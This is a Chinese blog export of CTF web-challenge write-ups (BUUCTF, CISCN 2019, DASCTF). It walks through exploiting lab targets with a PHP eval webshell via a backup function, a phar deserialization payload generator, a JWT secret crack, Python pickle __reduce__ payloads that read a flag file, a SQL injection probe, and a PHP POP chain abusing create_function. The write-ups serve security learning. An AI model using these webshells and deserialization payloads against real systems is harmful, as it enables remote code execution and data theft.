<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$people = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Bill&quot;</span>, <span class="hljs-string">&quot;Steve&quot;</span>, <span class="hljs-string">&quot;Mark&quot;</span>, <span class="hljs-string">&quot;David&quot;</span>);<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-string">&quot;Mark&quot;</span>, $people))<br>  &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;匹配已找到&quot;</span>;<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;匹配未找到&quot;</span>;<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>echo “匹配已找到”</p>
<p>2.backup.class.php,备份功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>class back&#123;<br>    public $filename;<br>    public $method;<br>    public $dest;<br><br>    function __construct($config)&#123;<br>        $this-&gt;filename&#x3D;$config[&#39;filename&#39;];<br>        $this-&gt;method&#x3D;$config[&#39;method&#39;];<br>        $this-&gt;dest&#x3D;$config[&#39;dest&#39;];<br>        if(in_array($this-&gt;method, array(&#39;backup&#39;)))&#123;<br>            $this-&gt;&#123;$this-&gt;method&#125;($this-&gt;filename, $this-&gt;dest);<br>        &#125;else&#123;<br>                header(&#39;Location: &#x2F;&#39;);<br>        &#125;<br>    &#125;<br><br>    public function backup($filename, $dest)&#123;<br>        $filename&#x3D;&#39;profile&#x2F;&#39;.$filename;<br>        if(file_exists($filename))&#123;<br>            $content&#x3D;htmlspecialchars(file_get_contents($filename),ENT_QUOTES);<br>            $password&#x3D;$this-&gt;random_code();<br>            $r[&#39;path&#39;]&#x3D;$this-&gt;_write($dest, $this-&gt;_create($password, $content));<br>            $r[&#39;password&#39;]&#x3D;$password;<br>            echo json_encode($r);<br>        &#125;<br>    &#125;<br><br>    &#x2F;* 先验证保证为备份文件后,再保存为私藏文件 *&#x2F;<br>    private function _write($dest, $content)&#123;<br>        $f1&#x3D;$dest;<br>        $f2&#x3D;&#39;private&#x2F;&#39;.$this-&gt;random_code(10).&quot;.php&quot;;<br><br>        $stream_f1 &#x3D; fopen($f1, &#39;w+&#39;);<br>        fwrite($stream_f1, $content);<br>        rewind($stream_f1);<br>        $f1_read&#x3D;fread($stream_f1, 3000);<br><br>        preg_match(&#39;&#x2F;^&lt;\?php \$_GET\[\&quot;password\&quot;\]&#x3D;&#x3D;&#x3D;\&quot;[a-zA-Z0-9]&#123;8&#125;\&quot;\?print\(\&quot;.*\&quot;\):exit\(\); $&#x2F;s&#39;, $f1_read, $matches);<br><br>        if(!empty($matches[0]))&#123;<br>            copy($f1,$f2);<br>            fclose($stream_f1);   <br>            return $f2;     <br>        &#125;else&#123;<br>            fwrite($stream_f1, &#39;&lt;?php exit(); ?&gt;&#39;);<br>            fclose($stream_f1);<br>            return false;<br>        &#125;<br><br>    &#125;<br><br>    private function _create($password, $content)&#123;<br>        $_content&#x3D;&#39;&lt;?php $_GET[&quot;password&quot;]&#x3D;&#x3D;&#x3D;&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;;<br>        return $_content;<br>    &#125;<br><br>    private function random_code($length &#x3D; 8,$chars &#x3D; null)&#123;<br>        if(empty($chars))&#123;<br>            $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;<br>        &#125;<br>        $count &#x3D; strlen($chars) - 1;<br>        $code &#x3D; &#39;&#39;;<br>        while( strlen($code) &lt; $length)&#123;<br>            $code .&#x3D; substr($chars,rand(0,$count),1);<br>        &#125;<br>        return $code;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>程序首先将<code>$filename</code>拼接到<code>profile/</code>，然后检测文件是否存在，若存在，将文件内容读出来进行html编码，然后生成一个随机的字符串作为读取文件内容的密码，</p>
<p>之后调用<code>_create()</code>函数，将密码和html编码后的文件内容，拼接到<code>&#39;&lt;?php $_GET[&quot;password&quot;]===&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;</code>里，</p>
<p>之后调用<code>_write()</code>函数，将上面这段php代码写进<code>private</code>目录，然后对文件内容内容进行正则表达式的检测，若通过检测,将文件内容写进<code>$dest</code>，并复制一份到<code>$f2</code>，若没有通过检测，则在<code>$dest</code>中写入<code>&lt;?php exit(); ?&gt;</code>。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">理清程序大体流程后，大致的攻击思路就是上传一个txt的文件，然后再通过<span class="hljs-keyword">back</span>生成php文件<br></code></pre></td></tr></table></figure>

<p>上传txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">$&#123;eval($_GET[0])&#125;<br></code></pre></td></tr></table></figure>

<p>进行备份，生成php文件</p>
<p><img src="/2021/09/04/2021/buu/20/image-20210905101422842.png" alt="image-20210905101422842"></p>
<p>执行参数0</p>
<p><img src="/2021/09/04/2021/buu/20/image-20210905101726252.png" alt="image-20210905101726252"></p>
<h4 id="GameExp"><a href="#GameExp" class="headerlink" title="GameExp:"></a>GameExp:</h4><p>这题也是坑了很久啊</p>
<p>首先是为了在目录下生成phar文件</p>
<p>需要修改配置php.ini，找了好久才解决：</p>
<p><a href="https://blog.csdn.net/weixin_35835030/article/details/116174720">https://blog.csdn.net/weixin_35835030/article/details/116174720</a></p>
<p>创建createphar.php文件（这以后可以用作phar文件解题模板）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;<br> <span class="hljs-keyword">var</span> $output = <span class="hljs-string">&#x27;eval($_REQUEST[0]);&#x27;</span>;<br>&#125;<br>@unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>$phar-&gt;startBuffering();<br>$phar-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif⽂件头</span><br>$o = <span class="hljs-keyword">new</span> AnyClass();<br>$phar-&gt;setMetadata($o); <span class="hljs-comment">//将⾃定义meta-data存⼊manifest</span><br>$phar-&gt;addFromString(<span class="hljs-string">&quot;test.jpg&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的⽂件</span><br><span class="hljs-comment">//签名⾃动计算</span><br>$phar-&gt;stopBuffering();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后在有php.exe的目录下，执行命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">php  createphar.php<br></code></pre></td></tr></table></figure>

<p>这时候目录下就会生成php.phar,然后重命名为php.gif</p>
<p>然后在register页面注册时上传该文件</p>
<p>注册名随意，这里我用lex</p>
<p><img src="/2021/09/04/2021/buu/20/image-20210907174315906.png" alt="image-20210907174315906"></p>
<p>还可以验证一下是否上传成功</p>
<p><img src="/2021/09/04/2021/buu/20/image-20210907174611006.png" alt="image-20210907174611006"></p>
<p>接着重新注册一次，并且要用抓包修改，用户名注意要用刚刚注册的，</p>
<p>来触发反序列化,在post增添命令</p>
<p><img src="/2021/09/04/2021/buu/20/image-20210907175822286.png" alt="image-20210907175822286"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web2 ikun &amp; CISCN 2019华北Day2 Web1&amp;CISCN2019 华北赛区 Day1 Web5 CyberPunk</title>
    <url>/2021/09/21/2021/buu/22/</url>
    <content><![CDATA[<h3 id="pickle、jwt"><a href="#pickle、jwt" class="headerlink" title="pickle、jwt"></a>pickle、jwt</h3><p>这道题还是跟着wp做了一遍</p>
<p>先记录一下思路</p>
<p>进去之后是个购物页面，很多* li *li标志小电视的商品</p>
<p>按照提示，我们需要买lv6的才行</p>
<p>翻页寻找了好久都没有</p>
<p>原理是要用脚本跑一下啊</p>
<p>很快，找到了第180页有这个商品</p>
<p>但是太贵了，远远超出我们的钱包</p>
<p>于是抓包想修改折扣蒙混过关</p>
<p>好家伙，说没有以admin访问不行</p>
<p>然后知道了要从jwt入手，我觉得这个有点像令牌token和cookie吧</p>
<p>就是浏览器用这个东西来识别你的身份</p>
<p>进入jwt官方页面修改之后成功购买</p>
<p>查看源码</p>
<p>提示我们下载文件</p>
<p>下载之后就是难的python的pickle漏洞</p>
<p><strong>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</strong></p>
<p>做题：</p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924202100689.png" alt="image-20210924202100689"></p>
<p>按照提示，利用脚本寻找一下lv6的踪迹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    url = <span class="hljs-string">&quot;http://06312721-18d2-4fee-bac0-d6591cf2e757.node4.buuoj.cn:81/shop?page=&#123;&#125;&quot;</span><br>    url = url.format(i)<br>    print(url)<br>    r = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;lv6.png&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">and</span> r.status_code == <span class="hljs-number">200</span>:<br>        print(<span class="hljs-string">&quot;find it:&quot;</span> ,url)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021/buu/22/image-20210924202357414.png" alt="image-20210924202357414"></p>
<p>访问page181</p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924202458922.png" alt="image-20210924202458922"></p>
<p>找到这个刺头了，买它！！！</p>
<p>结果，操作失败hh</p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924202659335.png" alt="image-20210924202659335"></p>
<p>偷偷放进抓包里修改金额</p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924203723295.png" alt="image-20210924203723295"></p>
<p>提示我们需要admin权限啊</p>
<p>跳过了得到密钥一步</p>
<p>这里用到的的是jwt-cracker脚本</p>
<p><img src="/2021/09/21/2021/buu/22/image-20220212133356702.png" alt="image-20220212133356702"></p>
<p>得到密钥为1Kun</p>
<p>这里我是在ubuntu上运行的，kali不知道为什么安装头文件一直报错（感动文件终于可以直接复制到Ubuntu了）</p>
<p>JWT修改</p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924204157770.png" alt="image-20210924204157770"></p>
<p>成功访问</p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924204354932.png" alt="image-20210924204354932"></p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924204124430.png" alt="image-20210924204124430"></p>
<p>按照提示下载源码</p>
<p>查看代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span>(<span class="hljs-params">BaseHandler</span>):</span><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span><br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br><span class="hljs-meta">@tornado.web.authenticated</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>        p = pickle.loads(urllib.unquote(become))<br>        <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。<br>其实反序列化漏洞思路都是差不多的<br>就是找到序列化的参数，看他可不可以修改，可以修改就可以进行任意文件读取或者命令执行<br>这里我们可以修改become这个参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-comment">#python2</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))    <span class="hljs-comment">#打开读取flag.txt的内容</span><br><br>a = pickle.dumps(payload())  <span class="hljs-comment">#序列化payload</span><br>a = urllib.quote(a)  <span class="hljs-comment">#进行url编码</span><br><span class="hljs-keyword">print</span> a<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-comment">#python3</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (eval,(<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;).read()&quot;</span>,))<br><br>a=exp()<br>s=pickle.dumps(a)<br><span class="hljs-keyword">print</span> urllib.quote(s)<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<p><img src="/2021/09/21/2021/buu/22/image-20210924205124943.png" alt="image-20210924205124943"></p>
<p>传入become参数即可</p>
<p><img src="/2021/09/21/2021/buu/22/image-20220212131817592.png" alt="image-20220212131817592"></p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><img src="/2021/09/21/2021/buu/22/image-20211020225542139.png" alt="image-20211020225542139"></p>
<p>试了一下数字1和2可以</p>
<p><img src="/2021/09/21/2021/buu/22/image-20211020225635311.png" alt="image-20211020225635311"></p>
<p><img src="/2021/09/21/2021/buu/22/image-20211020225652592.png" alt="image-20211020225652592"></p>
<p>之后其他数字和字符都不行</p>
<p><img src="/2021/09/21/2021/buu/22/image-20211020225722077.png" alt="image-20211020225722077"></p>
<p>试了一下普通的sql注入也不行</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021/buu/22/image-20211020225743352.png" alt="image-20211020225743352"></p>
<p>按照题目提示是盲注</p>
<p>但是明显手工注入很慢 ==</p>
<p>看了wp是用抓包分析</p>
<h3 id="伪协议文件读取和报错注入"><a href="#伪协议文件读取和报错注入" class="headerlink" title="伪协议文件读取和报错注入"></a>伪协议文件读取和报错注入</h3>]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF hellounser</title>
    <url>/2021/09/25/2021/buu/23/</url>
    <content><![CDATA[<p> 源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $func;<br>    <span class="hljs-keyword">public</span> $arg;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $func = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;func) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No!No!No!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>            <span class="hljs-comment">//There is no code to print flag in flag.php</span><br>            $func(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;Nice Job!!&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    $aaa = unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    $aaa();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="类A"><a href="#类A" class="headerlink" title="类A"></a>类A</h5><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>类A比较简单</p>
<p>先定义公共变量</p>
<h6 id="PHP中的-this用法："><a href="#PHP中的-this用法：" class="headerlink" title="PHP中的$this用法："></a>PHP中的$this用法：</h6><p>this是指向当前对象的指针</p>
<p><img src="/2021/09/25/2021/buu/23/image-20210925201706608.png" alt="image-20210925201706608"></p>
<h6 id="invoke-函数"><a href="#invoke-函数" class="headerlink" title="__invoke()函数"></a>__invoke()函数</h6><p>当以函数方式调用对象时被调用</p>
<h5 id="类B"><a href="#类B" class="headerlink" title="类B"></a>类B</h5><pre><code>class B&#123;
    public $func;
    public $arg;public function show()&#123;
    $func = $this-&gt;func;
    if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $this-&gt;arg)) &#123;
        die(&#39;No!No!No!&#39;);
    &#125; else &#123;
        include &quot;flag.php&quot;;
        //There is no code to print flag in flag.php
        $func(&#39;&#39;, $this-&gt;arg);
    &#125;
&#125;

public function __toString()&#123;
    $this-&gt;show();
    return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;
&#125;
&#125;</code></pre>
<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><p>当对象为字符串时触发</p>
<p>思路：</p>
<p>new两个新的a类和b类变量</p>
<p>然后b类调用create_function函数方法：</p>
<p><code>create_function()</code>会创建一个匿名函数（<code>lambda</code>样式）。</p>
<p>create_function()函数会在内部执行 eval()<a href="https://www.cnblogs.com/-qing-/p/10816089.html">代码审计之create_function()函数 - 卿先生 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">arg</span>=<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>变量b赋值<br>}这个是为了闭合前面的<br>//这个是为了注释后面的</p>
<p>base64绕过正则过滤，var_dump输出数据，get_defined_vars()函数返回由所有已定义变量所组成的数组。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">var</span>=<span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure>

<p>将b的值与a联系，触发_invoke函数从而触发show()</p>
<p>最后再序列化a</p>
<p>不过我们得先找到flag到底在哪个文件里：</p>
<p>经过热心同学的帮助，今天才懂得 include flag.php 包含的意思</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">就相当于现在<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>里面的变量已经同步到我现在这个<span class="hljs-selector-tag">php</span>文件里面<br><br><br><br>比如说我在1<span class="hljs-selector-class">.php</span> 写<span class="hljs-selector-tag">include</span> “<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>”<br><br><br><br>那么这个时候<br><br><br><br><span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>里面定义过的变量还有函数<br><br><br><br>我在1<span class="hljs-selector-class">.php</span>里面也可以用<br><br><br></code></pre></td></tr></table></figure>

<p>所以在赋值时先直接打印当前php文件的变量值(也就是相当于打印flag.php里的内容)</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">arg</span>=<span class="hljs-string">&quot;&#125;var_dump(get_defined_vars());//&quot;</span>;<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/25/2021/buu/23/image-20210926192749869.png" alt="image-20210926192749869"></p>
<p>放上exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $func;<br>    <span class="hljs-keyword">public</span> $arg;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $func = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;func) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No!No!No!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>            <span class="hljs-comment">//There is no code to print flag in flag.php</span><br>            $func(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;Nice Job!!&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br><br>&#125;<br><br>$a=<span class="hljs-keyword">new</span> A();<br>$b=<span class="hljs-keyword">new</span> B();<br>$b-&gt;func=<span class="hljs-string">&quot;create_function&quot;</span>;<br>$b-&gt;arg=<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;<br>$a-&gt;var=$b;<br><span class="hljs-keyword">echo</span> serialize($a);<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>跑出pop链</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:&quot;A&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;create_function&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">73</span>:<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;&#125;&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/25/2021/buu/23/image-20210925200601616.png" alt="image-20210925200601616"></p>
<p>之后再看看这篇文章</p>
